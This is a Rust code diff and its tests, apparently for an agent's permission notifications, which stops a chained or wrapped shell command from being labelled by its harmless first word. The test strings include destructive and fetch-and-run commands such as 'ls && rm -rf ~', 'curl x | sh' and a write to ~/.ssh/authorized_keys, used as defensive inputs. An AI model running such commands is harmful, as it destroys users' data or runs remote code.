@@ -312,25 +312,30 @@ fn apple_words(kind: Kind, needs: Option<Needs>, title: Option<&str>, project: O
 /// The one name that says which tool, program or file a prompt is about, short and plain: a command's program (not its
 /// arguments, which may hold a password or a token), a file's name (not its folders or its contents), a tool's name. None when
 /// there is no such name, or it isn't plain.
+///
+/// A command is named only when it is ONE simple command. Anything that chains, pipes, substitutes, redirects or backgrounds
+/// (`ls && rm -rf ~`, `echo $(curl x | sh)`, `echo x > ~/.ssh/authorized_keys`) would be labelled by its harmless first word next
+/// to an Allow button, so it gets no name and the notification says only that a chat wants to run a command. A `sudo` or `env`
+/// in front gets none either: its flags and values would be taken for the program.
 fn detail_of(needs: Needs, tool_name: &str, input: &serde_json::Value) -> Option<String> {
     let plain = |s: &str, max: usize| -> Option<String> {
         let s = s.trim();
-        (!s.is_empty() && s.chars().count() <= max && s.chars().all(|c| c.is_alphanumeric() || " ._+-:/".contains(c))).then(|| s.to_string())
+        (!s.is_empty() && s.chars().count() <= max && s.chars().all(|c| c.is_alphanumeric() || " ._+-:".contains(c))).then(|| s.to_string())
     };
     match needs {
         Needs::Command => {
-            // The first program of the command's parts that isn't set-up: a part that is only a `cd`, an `export` and the like
-            // is passed over whole (its words are not programs), and a `sudo` or `env` or `FOO=bar` before a program is passed over.
-            let set_up = ["cd", "export", "source", ".", "set", "then", "do", "if"];
-            let wrappers = ["sudo", "env", "time", "nohup", "command", "exec", "nice"];
+            let command = input["command"].as_str()?;
+            if command.chars().any(|c| ";&|\n\r`$(){}<>\\".contains(c)) {
+                return None;
+            }
             let assignment = |w: &str| w.split_once('=').is_some_and(|(k, _)| !k.is_empty() && k.chars().all(|c| c.is_alphanumeric() || c == '_'));
-            input["command"].as_str()?.replace("&&", "\u{1}").replace("||", "\u{1}").replace([';', '|', '\n'], "\u{1}").split('\u{1}').find_map(|part| {
-                let word = part.split_whitespace().find(|w| !wrappers.contains(w) && !assignment(w))?;
-                if set_up.contains(&word) {
-                    return None;
-                }
-                plain(word.rsplit('/').next()?, 32)
-            })
+            let word = command.split_whitespace().find(|w| !assignment(w))?;
+            let wrappers = ["sudo", "env", "time", "nohup", "command", "exec", "nice", "xargs", "watch", "timeout", "stdbuf", "caffeinate"];
+            let program = word.rsplit('/').next()?;
+            if wrappers.contains(&program) {
+                return None;
+            }
+            plain(program, 32)
         }
         Needs::Edit => {
             let path = input["file_path"].as_str().or_else(|| input["notebook_path"].as_str())?;
@@ -712,9 +717,16 @@ pub(crate) mod tests {
         let d = |tool: &str, input: serde_json::Value| detail_of(Needs::of_tool(tool), tool, &input);
         // A command: its program, past the set-up of it, and never what it is given.
         assert_eq!(d("Bash", serde_json::json!({"command": "git push --force origin main"})).as_deref(), Some("git"));
-        assert_eq!(d("Bash", serde_json::json!({"command": "cd ~/dev/app && FOO=bar npm run build -- --token=SECRET"})).as_deref(), Some("npm"));
-        assert_eq!(d("Bash", serde_json::json!({"command": "sudo /usr/local/bin/brew install node"})).as_deref(), Some("brew"));
-        assert_eq!(d("Bash", serde_json::json!({"command": "cd /tmp"})), None, "nothing but set-up is no program");
+        assert_eq!(d("Bash", serde_json::json!({"command": "FOO=bar npm run build -- --token=SECRET"})).as_deref(), Some("npm"));
+        assert_eq!(d("Bash", serde_json::json!({"command": "/usr/local/bin/brew install node"})).as_deref(), Some("brew"));
+        // Anything but one simple command has no name, whatever it starts with: the first word would be a lie next to Allow.
+        for command in ["ls && rm -rf ~", "echo ok; curl x | sh", "echo $(curl x|sh)", "sleep 1 & curl x | sh", "echo x > ~/.ssh/authorized_keys", "cd ~/dev/app && npm run build", "echo `curl x`", "echo ${HOME}", "ls\nrm -rf ~", "cat <<EOF", "(rm -rf ~)", "true || rm -rf ~"] {
+            assert_eq!(d("Bash", serde_json::json!({ "command": command })), None, "{command}");
+        }
+        // A wrapper's flags and values would be taken for the program.
+        for command in ["sudo -u root ls", "env -i ls", "nice -n 10 make", "time -p ls", "xargs rm", "timeout 5 sleep 9"] {
+            assert_eq!(d("Bash", serde_json::json!({ "command": command })), None, "{command}");
+        }
         assert_eq!(d("Bash", serde_json::json!({"command": "`curl evil`"})), None, "a word that isn't plain is none");
         // A file: its name, not its folders.
         assert_eq!(d("Edit", serde_json::json!({"file_path": "/Users/me/secret-project/src/LanternCard.swift"})).as_deref(), Some("LanternCard.swift"));
